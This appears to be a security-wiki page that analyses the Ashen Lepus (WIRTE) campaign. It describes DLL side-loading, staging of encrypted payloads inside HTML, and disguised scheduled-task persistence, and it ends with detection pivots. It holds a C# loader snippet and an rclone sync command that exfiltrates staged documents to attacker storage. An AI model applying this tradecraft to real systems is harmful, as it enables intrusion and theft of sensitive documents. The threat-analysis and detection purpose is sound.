# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) weaponized a repeatable pattern that chains DLL sideloading, staged HTML payloads, and modular .NET backdoors to persist inside Middle Eastern diplomatic networks. The technique is reusable by any operator because it relies on:

- **Archive-based social engineering**: benign PDFs instruct targets to pull a RAR archive from a file-sharing site. The archive bundles a real-looking document viewer EXE, a malicious DLL named after a trusted library (e.g., `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), and a decoy `Document.pdf`.
- **DLL search order abuse**: the victim double-clicks the EXE, Windows resolves the DLL import from the current directory, and the malicious loader (AshenLoader) executes inside the trusted process while the decoy PDF opens to avoid suspicion.
- **Living-off-the-land staging**: every later stage (AshenStager → AshenOrchestrator → modules) is kept off disk until needed, delivered as encrypted blobs hidden inside otherwise harmless HTML responses.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: the EXE side-loads AshenLoader, which performs host recon, AES-CTR encrypts it, and POSTs it inside rotating parameters such as `token=`, `id=`, `q=`, or `auth=` to API-looking paths (e.g., `/api/v2/account`).
2. **HTML extraction**: the C2 only betrays the next stage when the client IP geolocates to the target region and the `User-Agent` matches the implant, frustrating sandboxes. When the checks pass the HTTP body contains a `<headerp>...</headerp>` blob with the Base64/AES-CTR encrypted AshenStager payload.
3. **Second sideload**: AshenStager is deployed with another legitimate binary that imports `wtsapi32.dll`. The malicious copy injected into the binary fetches more HTML, this time carving `<article>...</article>` to recover AshenOrchestrator.
4. **AshenOrchestrator**: a modular .NET controller that decodes a Base64 JSON config. The config’s `tg` and `au` fields are concatenated/hashed into the AES key, which decrypts `xrk`. The resulting bytes act as an XOR key for every module blob fetched afterwards.
5. **Module delivery**: each module is described through HTML comments that redirect the parser to an arbitrary tag, breaking static rules that look only for `<headerp>` or `<article>`. Modules include persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), and file exploration (`FE`).

### HTML Container Parsing Pattern

```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```

Even if defenders block or strip a specific element, the operator only needs to change the tag hinted in the HTML comment to resume delivery.

## Crypto & C2 Hardening

- **AES-CTR everywhere**: current loaders embed 256-bit keys plus nonces (e.g., `{9a 20 51 98 ...}`) and optionally add an XOR layer using strings such as `msasn1.dll` before/after decryption.
- **Recon smuggling**: enumerated data now includes Program Files listings to spot high-value apps and is always encrypted before it leaves the host.
- **URI churn**: query parameters and REST paths rotate between campaigns (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidating brittle detections.
- **Gated delivery**: servers are geo-fenced and only answer real implants. Unapproved clients receive unsuspicious HTML.

## Persistence & Execution Loop

AshenStager drops scheduled tasks that masquerade as Windows maintenance jobs and execute via `svchost.exe`, e.g.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

These tasks relaunch the sideloading chain on boot or at intervals, ensuring AshenOrchestrator can request fresh modules without touching disk again.

## Using Benign Sync Clients for Exfiltration

Operators stage diplomatic documents inside `C:\Users\Public` (world-readable and non-suspicious) through a dedicated module, then download the legitimate [Rclone](https://rclone.org/) binary to synchronize that directory with attacker storage:

1. **Stage**: copy/collect target files into `C:\Users\Public\{campaign}\`.
2. **Configure**: ship an Rclone config pointing at an attacker-controlled HTTPS endpoint (e.g., `api.technology-system[.]com`).
3. **Sync**: run `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` so the traffic resembles normal cloud backups.

Because Rclone is widely used for legitimate backup workflows, defenders must focus on anomalous executions (new binaries, odd remotes, or sudden syncing of `C:\Users\Public`).

## Detection Pivots

- Alert on **signed processes** that unexpectedly load DLLs from user-writable paths (Procmon filters + `Get-ProcessMitigation -Module`), especially when the DLL names overlap with `netutils`, `srvcli`, `dwampi`, or `wtsapi32`.
- Inspect suspicious HTTPS responses for **large Base64 blobs embedded inside unusual tags** or guarded by `<!-- TAG: <xyz> -->` comments.
- Hunt for **scheduled tasks** that run `svchost.exe` with non-service arguments or point back to dropper directories.
- Monitor for **Rclone** binaries appearing outside IT-managed locations, new `rclone.conf` files, or sync jobs pulling from staging directories like `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)

{{#include ../../../banners/hacktricks-training.md}}
